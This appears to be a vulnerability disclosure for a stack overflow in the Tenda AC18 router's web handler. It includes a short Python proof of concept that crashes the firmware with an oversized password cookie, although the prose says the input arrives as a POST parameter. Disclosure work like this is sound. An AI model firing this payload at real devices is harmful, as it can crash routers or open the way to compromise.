## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `R7WebsSecurityHandler` function. The `src` variable receives the `password` parameter from a POST request and is later assigned to the `v35` variable, which is fixed at 128 bytes. However, since the user can control the input of `password`, the statement `strcpy(v35, src);` can cause a buffer overflow. The user-provided  `password` can exceed the capacity of the `v35` array, triggering this security vulnerability.

![image-20240307162438572](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307162438572.png)

![image-20240307162456041](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307162456041.png)

![image-20240307162504018](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307162504018.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"password=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

![image-20240307162654296](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307162654296.png)